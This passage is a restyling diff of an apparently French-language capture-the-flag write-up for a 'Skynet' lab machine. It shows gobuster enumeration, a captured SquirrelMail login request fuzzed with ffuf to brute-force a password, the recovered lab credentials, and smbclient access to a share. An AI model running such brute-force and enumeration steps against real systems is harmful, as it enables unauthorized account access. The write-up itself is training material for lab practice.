+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  13   │ terminator101</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  14   │ terminator10</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  15   │ terminator02</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  16   │ terminator00</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  17   │ roboterminator</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  18   │ pongterminator</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  19   │ manasturcaluterminator</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  20   │ exterminator95</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  21   │ exterminator200</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  22   │ dterminator</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  23   │ djxterminator</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  24   │ dexterminator</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  25   │ determinator</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  26   │ cyborg007haloterminator</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  27   │ avsterminator</span>
+</code></code></pre></div></div>
 <p>Il s’agit d’une liste de mots de passe. Il nous seras probalement utile plus tard</p>
 <h3 id="repertoires-caches">Répertoires cachés</h3>
 <p>En se rendant à la page d’acceuil <a href="http://skynet.thm"><code>http://skynet.thm</code></a> on tombe sur cette page</p>
 <p><img alt="image.png" src="attachment:fc062a7d-21ed-4099-8317-35a05703858e:image.png"/></p>
 <p>Nous allons lister les dossiers cachés grace à <code>gobuster</code> </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">gobuster dir -u http://skynet.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">gobuster dir -u http://skynet.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
+</code></code></pre></div></div>
 <p>On a donc le résultat suivant:</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Gobuster v3.8</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Url:                     http://skynet.thm/</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Method:                  GET</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Threads:                 10</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Negative Status codes:   404</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] User Agent:              gobuster/3.8</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Timeout:                 10s</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Starting gobuster in directory enumeration mode</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/.htpasswd            (Status: 403) [Size: 275]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/.hta                 (Status: 403) [Size: 275]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/.htaccess            (Status: 403) [Size: 275]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/admin                (Status: 301) [Size: 308] [--&gt; http://skynet.thm/admin/]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/config               (Status: 301) [Size: 309] [--&gt; http://skynet.thm/config/]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/css                  (Status: 301) [Size: 306] [--&gt; http://skynet.thm/css/]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/index.html           (Status: 200) [Size: 523]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/js                   (Status: 301) [Size: 305] [--&gt; http://skynet.thm/js/]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/server-status        (Status: 403) [Size: 275]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/squirrelmail         (Status: 301) [Size: 315] [--&gt; http://skynet.thm/squirrelmail/]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Progress: 4750 / 4750 (100.00%)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Finished</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Gobuster v3.8</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Url:                     http://skynet.thm/</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Method:                  GET</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Threads:                 10</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Negative Status codes:   404</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] User Agent:              gobuster/3.8</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Timeout:                 10s</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Starting gobuster in directory enumeration mode</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/.htpasswd            (Status: 403) [Size: 275]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/.hta                 (Status: 403) [Size: 275]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/.htaccess            (Status: 403) [Size: 275]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/admin                (Status: 301) [Size: 308] [--&gt; http://skynet.thm/admin/]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/config               (Status: 301) [Size: 309] [--&gt; http://skynet.thm/config/]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/css                  (Status: 301) [Size: 306] [--&gt; http://skynet.thm/css/]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/index.html           (Status: 200) [Size: 523]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/js                   (Status: 301) [Size: 305] [--&gt; http://skynet.thm/js/]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/server-status        (Status: 403) [Size: 275]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/squirrelmail         (Status: 301) [Size: 315] [--&gt; http://skynet.thm/squirrelmail/]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Progress: 4750 / 4750 (100.00%)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Finished</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+</code></code></pre></div></div>
 <p>On tombe sur un dossier intéressant <code>/squirrelmail</code> . En se rendant sur sur <code>http://skynet.com/squirrelmail</code> on tombe sur un formulaire de connection. Rappellons nous que nous avons récupérer un username <code>milesdyson</code>  et une liste de mot de passe. Essayons de faire du bruteforce. Nous allons utilisé les identifiants</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">username: milesdyson</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">password: test</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">username: milesdyson</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">password: test</span>
+</code></code></pre></div></div>
 <p>Après avoir intercepté la requête avec <code>burpsuite</code> on peut copier son contenu dans un fichier request.txt</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">POST /squirrelmail/src/redirect.php HTTP/1.1</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Host: skynet.thm</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Accept-Language: en-US,en;q=0.5</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Accept-Encoding: gzip, deflate, br</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Content-Type: application/x-www-form-urlencoded</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Content-Length: 75</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Origin: http://skynet.thm</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Connection: keep-alive</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Referer: http://skynet.thm/squirrelmail/src/login.php</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Cookie: squirrelmail_language=en_US; SQMSESSID=<votre_id>; PHPSESSID=<votr_id></votr_id></votre_id></span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Upgrade-Insecure-Requests: 1</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Priority: u=0, i</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">login_username=milesdyson&amp;secretkey=**FUZZ**&amp;js_autodetect_results=1&amp;just_logged_in=1</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">POST /squirrelmail/src/redirect.php HTTP/1.1</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Host: skynet.thm</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Accept-Language: en-US,en;q=0.5</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Accept-Encoding: gzip, deflate, br</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Content-Type: application/x-www-form-urlencoded</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Content-Length: 75</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Origin: http://skynet.thm</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Connection: keep-alive</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Referer: http://skynet.thm/squirrelmail/src/login.php</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Cookie: squirrelmail_language=en_US; SQMSESSID=<votre_id>; PHPSESSID=<votr_id></votr_id></votre_id></span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Upgrade-Insecure-Requests: 1</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Priority: u=0, i</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">login_username=milesdyson&amp;secretkey=**FUZZ**&amp;js_autodetect_results=1&amp;just_logged_in=1</span>
+</code></code></pre></div></div>
 <p>Le terme FUZZ est mis dans le fichier pour ce soit ce champ qui soit remplie.</p>
 <p>On va donc utiliser <code>ffuf</code> pour déterminer le mot de passe</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ffuf -request request.txt -request-proto http -w log1.txt -fr "Unknown user or password incorrect"</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ffuf -request request.txt -request-proto http -w log1.txt -fr "Unknown user or password incorrect"</span>
+</code></code></pre></div></div>
 <p>Cela nous donne</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cyborg007haloterminator [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 358ms]</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">cyborg007haloterminator [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 358ms]</span>
+</code></code></pre></div></div>
 <p>On a donc les identifiants on peut se connecter</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Username : milesdyson</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Password: cyborg007haloterminator</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Username : milesdyson</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Password: cyborg007haloterminator</span>
+</code></code></pre></div></div>
 <p>On accède ainsi à la boîte mail de Miles Dyson. En consultant ses mails on tombe sur celui à propos de la réinitialisation de son mot de passe Samba</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>We have changed your smb password after system malfunction.
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>We have changed your smb password after system malfunction.
 Password: )s{A&amp;2Z=F^n_E.B`
-</code></pre></div>
+</code></code></pre></div></div>
 <p>On peut alors se connecter au partage milesdyson qui nous demandais un mot de passe</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smbclient //skynet.thm/milesdyson -U milesdyson </span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Password for [WORKGROUP\milesdyson]:</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Try "help" to get a list of possible commands.</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \&gt; ls</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  .                                   D        0  Tue Sep 17 10:05:47 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  ..                                  D        0  Wed Sep 18 04:51:03 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  notes                               D        0  Tue Sep 17 10:18:40 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">        9204224 blocks of size 1024. 5831368 blocks available</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \&gt; cd notes\</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \notes\&gt; ls</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  .                                   D        0  Tue Sep 17 10:18:40 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  ..                                  D        0  Tue Sep 17 10:05:47 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  3.01 Search.md                      N    65601  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  2.08 In Practice.md                 N     7949  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  0.00 Cover.md                       N     3114  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  important.txt                       N      117  Tue Sep 17 10:18:39 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  6.01 pandas.md                      N     9221  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  2.01 Overview.md                    N     1165  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  3.02 Planning.md                    N    71657  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.04 Probability.md                 N    62712  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  2.00 Machine Learning.md            N       26  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.03 Calculus.md                    N    40779  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  6.00 Appendices.md                  N       20  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.01 Functions.md                   N     7627  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  2.03 Neural Nets.md                 N   144726  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  2.04 Model Selection.md             N    33383  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  2.02 Supervised Learning.md         N    94287  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  4.00 Simulation.md                  N       20  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  3.05 In Practice.md                 N     1123  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.07 Graphs.md                      N     5110  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  5.03 Anonymization.md               N     2516  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  5.01 Process.md                     N     5788  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.09 Optimization.md                N    25823  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.05 Statistics.md                  N    64291  Tue Sep 17 10:01:29 2019</span>
